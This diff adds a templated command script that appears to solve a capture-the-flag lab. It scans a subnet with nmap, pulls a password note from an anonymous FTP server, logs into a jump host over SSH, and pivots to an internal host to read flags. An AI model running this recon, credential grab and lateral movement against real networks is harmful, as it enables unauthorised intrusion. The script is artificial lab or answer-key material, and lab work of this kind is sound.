@@ -1,0 +1,23 @@
+## your own network is not watched: find the jump host
+nmap -sn 10.10.7.0/24
+nmap -sV 10.10.7.20
+## anonymous FTP has the handover note with the pilot password
+ftp 10.10.7.20
+anonymous
+x
+cd pub
+get handover.txt
+bye
+cat handover.txt
+## sign in to the jump host and take its flag
+ssh -o StrictHostKeyChecking=accept-new pilot@10.10.7.20
+{{JPW}}
+cat flag.txt
+## no scan of the inside: the jump host's own files say where store01 is
+ip addr
+{{LOOKCMD}}
+ssh -o StrictHostKeyChecking=accept-new pilot@10.10.72.{{INNER}}
+{{JPW}}
+cat flag.txt
+exit
+exit
